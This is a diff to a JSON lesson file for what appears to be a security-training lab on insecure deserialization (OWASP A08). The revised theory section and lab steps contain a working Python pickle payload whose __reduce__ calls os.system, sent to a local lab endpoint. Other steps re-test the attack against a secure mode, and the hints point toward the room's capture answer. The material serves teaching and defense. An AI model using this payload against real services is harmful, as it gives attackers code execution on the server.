@@ -4,9 +4,9 @@
   "title": "Insecure Deserialization",
   "track": "OWASP Top 10",
   "difficulty": "advanced",
-  "estimate": "18 min",
+  "estimate": "25 min",
   "brief": "**Ticket:** a preferences endpoint deserializes data from the client with pickle. Understand why that is remote code execution.",
-  "theory": "## Insecure deserialization (OWASP A08)\nDeserializing attacker bytes with `pickle.loads` runs their code \u2014 RCE. Same risk: unsafe `yaml.load`, Java serialization.\n\n**Fix:** never deserialize untrusted data with pickle/yaml; use JSON (data only).",
+  "theory": "## What it is\nInsecure Deserialization is taking attacker-controlled serialized data and\nrebuilding objects from it unsafely. With formats that can reconstruct arbitrary\nobjects (Python `pickle`, unsafe YAML, Java serialization), deserializing hostile\ndata runs code.\n\n## How it works\nPython's `pickle.loads` will call an object's `__reduce__` during\ndeserialization. An attacker crafts a pickle whose `__reduce__` returns\n`(os.system, (\"command\",))`, so merely loading it executes the command on your\nserver. YAML's `full_load` and Java's `ObjectInputStream` have the same class of\nproblem.\n\n## In the real world\nThe Java **Apache Commons Collections** deserialization gadget (2015) gave remote\ncode execution to a wave of enterprise apps. Python `pickle` RCE is a recurring\nfinding wherever apps deserialize cookies, caches, or message payloads from\nclients.\n\n## How to prevent it\n**Never deserialize untrusted data with code-capable formats.** Use data-only\nformats (JSON) with a schema, or `yaml.safe_load`. If you must use rich\nserialization, sign the payload and verify the signature before loading.",
   "worked_example": "```python\nclass E:\n    def __reduce__(self):            # runs during pickle.loads\n        return (os.system, ('id',))\n```\nSending `pickle.dumps(E())` to a pickle sink runs `id` on the server.",
   "knowledge_check": [
     {
@@ -33,16 +33,17 @@
     }
   ],
   "investigation": {
-    "intro": "Run the deserialization exploit against the lab and watch code execute on the server.",
+    "intro": "Build a malicious pickle and get the server to run your code by merely loading it.",
     "steps": [
-      "```bash\ncd /workspaces/examto/appsec-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt\npython3 run_server.py               # leave this running\n```",
-      "In a second terminal, send a pickle payload that creates a file (proving RCE):\n```bash\npython3 - <<'EOF'\nimport base64,pickle,os,urllib.request\nm='/tmp/pwned_demo'; os.path.exists(m) and os.remove(m)\nclass E:\n    def __reduce__(self): return (os.system,(f'touch {m}',))\nurllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/prefs',data=base64.b64encode(pickle.dumps(E()))))\nprint('code executed on server:', os.path.exists(m))\nEOF\n```",
-      "It prints True \u2014 your payload ran a command on the server. The safe format you'd switch to is the answer below."
+      "**Start the lab app** (leave it running; open a *second* terminal tab for the attack):\n```bash\ncd /workspaces/examto/appsec-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate; pip install -q -r requirements.txt\npython3 run_server.py\n```",
+      "In a second terminal, send a crafted pickle to the preferences endpoint. The payload's `__reduce__` runs when the server calls `pickle.loads`, creating a marker file - proof of code execution:\n```bash\npython3 - <<'PY'\nimport base64, pickle, os, urllib.request\nmarker = \"/tmp/pwned_demo\"\nif os.path.exists(marker): os.remove(marker)\nclass Exploit:\n    def __reduce__(self):            # runs during pickle.loads\n        return (os.system, (f\"touch {marker}\",))\npayload = base64.b64encode(pickle.dumps(Exploit()))\nurllib.request.urlopen(urllib.request.Request(\"http://127.0.0.1:5000/prefs\", data=payload))\nprint(\"code executed on server:\", os.path.exists(marker))\nPY\n```\n`True` means your code ran inside the server process.",
+      "**Apply the fix and re-test.** Stop the server (Ctrl+C) and restart it in secure mode, then run the SAME attack again:\n```bash\nLAB_SECURE=1 python3 run_server.py\n```\nRe-send the payload: secure mode refuses pickle / uses a safe format, so no marker file appears.",
+      "Takeaway and capture: the safe choice for untrusted data is a data-only format - name it as the room's capture asks (JSON / safe_load)."
     ],
     "hints": [
-      "__reduce__ is what pickle runs.",
-      "The marker file appearing proves code execution.",
-      "The fix uses a data-only format."
+      "__reduce__ controls what pickle runs on load.",
+      "A True marker proves server-side code execution.",
+      "The fix is to avoid pickle for untrusted input."
     ]
   },
   "capture": {
